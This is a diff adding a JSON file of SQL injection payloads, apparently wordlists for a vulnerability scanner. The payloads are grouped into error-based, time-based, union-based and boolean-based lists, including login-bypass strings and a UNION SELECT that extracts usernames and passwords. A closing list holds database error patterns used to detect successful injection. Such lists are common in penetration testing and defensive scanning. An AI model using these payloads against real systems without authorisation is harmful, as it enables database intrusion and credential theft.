@@ -1,0 +1,67 @@
+{
+  "error_based": [
+    "' OR '1'='1",
+    "\" OR \"1\"=\"1",
+    "' OR '1'='1' --",
+    "' OR '1'='1' /*",
+    "' OR '1'='1' #",
+    "admin' --",
+    "admin' #",
+    "admin'/*",
+    "' or 1=1--",
+    "' or 1=1#",
+    "' or 1=1/*",
+    "') or '1'='1--",
+    "') or ('1'='1--",
+    "1' AND '1' = '1",
+    "1' AND '1' = '2",
+    "' UNION SELECT NULL--",
+    "' UNION SELECT NULL,NULL--",
+    "' UNION SELECT NULL,NULL,NULL--"
+  ],
+  "time_based": [
+    "'; WAITFOR DELAY '00:00:05'--",
+    "'; SELECT SLEEP(5)--",
+    "'; pg_sleep(5)--",
+    "' AND SLEEP(5)--",
+    "' AND pg_sleep(5)--",
+    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
+  ],
+  "union_based": [
+    "' UNION SELECT NULL--",
+    "' UNION SELECT NULL,NULL--",
+    "' UNION SELECT NULL,NULL,NULL--",
+    "' UNION SELECT username,password FROM users--",
+    "' UNION ALL SELECT NULL--"
+  ],
+  "boolean_based": [
+    "1' AND '1'='1",
+    "1' AND '1'='2",
+    "1 AND 1=1",
+    "1 AND 1=2"
+  ],
+  "error_patterns": [
+    "SQL syntax",
+    "mysql_fetch",
+    "mysql_num_rows",
+    "ORA-[0-9]{5}",
+    "PostgreSQL.*ERROR",
+    "Warning.*\\Wmysql_",
+    "valid MySQL result",
+    "MySqlClient\\.",
+    "com\\.mysql\\.jdbc",
+    "org\\.postgresql\\.util\\.PSQLException",
+    "Unclosed quotation mark",
+    "Microsoft OLE DB Provider for ODBC Drivers",
+    "Microsoft OLE DB Provider for SQL Server",
+    "Incorrect syntax near",
+    "You have an error in your SQL syntax",
+    "SQLServer JDBC Driver",
+    "Oracle error",
+    "DB2 SQL error",
+    "SQLSTATE",
+    "Syntax error",
+    "Warning: pg_",
+    "quoted string not properly terminated"
+  ]
+}
